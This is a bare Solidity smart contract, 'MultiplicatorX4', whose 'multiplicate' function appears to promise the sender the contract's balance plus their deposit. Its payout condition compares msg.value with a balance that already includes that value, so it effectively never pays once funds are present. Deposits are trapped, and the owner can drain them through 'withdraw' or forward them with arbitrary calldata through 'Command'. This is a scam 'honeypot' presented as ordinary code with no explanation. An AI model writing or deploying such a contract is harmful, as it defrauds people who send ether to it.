pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    struct S { address Owner; }
    S s = S(msg.sender);
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == s.Owner);
        s.Owner.transfer(this.balance);
    }
    
    function Command(address adr, bytes data)
    payable
    public
    {
        require(msg.sender == s.Owner);
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value >= this.balance)
        {        
            adr.transfer(this.balance + msg.value);
        }
    }
}